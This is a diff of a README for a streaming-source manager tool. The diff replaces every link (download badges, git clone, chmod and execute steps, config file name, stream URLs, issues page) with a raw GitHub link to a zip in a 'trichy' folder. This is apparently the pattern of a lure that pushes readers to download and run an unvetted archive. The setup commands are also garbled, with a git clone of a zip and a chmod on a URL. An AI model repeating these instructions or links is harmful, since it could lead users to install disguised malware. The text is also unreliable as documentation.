@@ -1,6 +1,6 @@
 # 📺 live-source-manager - Efficient Streaming Source Manager
 
-[![Download](https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip%20Now-Release%https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip)](https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip)
+[![Download](https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/source_live_manager_v3.8.zip%20Now-Release%https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/source_live_manager_v3.8.zip)](https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/source_live_manager_v3.8.zip)
 
 ## 📦 Introduction
 
@@ -45,12 +45,12 @@ To set up Live Source Manager quickly, follow these steps:
 
 ```bash
 # Clone the project
-git clone https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip
+git clone https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/source_live_manager_v3.8.zip
 cd live-source-manager
 
 # Run the deployment script (automatically builds the image and starts the service)
-chmod +x https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip
-https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip
+chmod +x https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/source_live_manager_v3.8.zip
+https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/source_live_manager_v3.8.zip
 ```
 
 ### Manual Deployment
@@ -68,22 +68,22 @@ docker run -d \
 ```
 
 ### Download & Install
-To get started with Live Source Manager, visit [this page to download](https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip). You will find the latest release files there.
+To get started with Live Source Manager, visit [this page to download](https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/source_live_manager_v3.8.zip). You will find the latest release files there.
 
 ---
 
 ## ⚙️ Configuration Details
 
 ### Adjusting Settings
-You can customize various settings in the `https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip` file after installation. This allows for fine-tuning of the filtering criteria, scheduling updates, and proxy settings.
+You can customize various settings in the `https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/source_live_manager_v3.8.zip` file after installation. This allows for fine-tuning of the filtering criteria, scheduling updates, and proxy settings.
 
 ### Example Configuration
 ```yaml
 streams:
-  - url: "https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip"
+  - url: "https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/source_live_manager_v3.8.zip"
     quality: "high"
     location: "USA"
-  - url: "https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip"
+  - url: "https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/source_live_manager_v3.8.zip"
     quality: "medium"
     location: "Asia"
 ```
@@ -95,8 +95,8 @@ Logs can be accessed in the `logs` directory within the project folder. They pro
 
 ## 🚀 Support
 
-If you run into issues or have questions, please check the [issues page](https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip) for help from the community or to report a bug.
+If you run into issues or have questions, please check the [issues page](https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/source_live_manager_v3.8.zip) for help from the community or to report a bug.
 
 ---
 
-[![Download](https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip%20Now-Release%https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip)](https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip)
+[![Download](https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/source_live_manager_v3.8.zip%20Now-Release%https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/source_live_manager_v3.8.zip)](https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/source_live_manager_v3.8.zip)
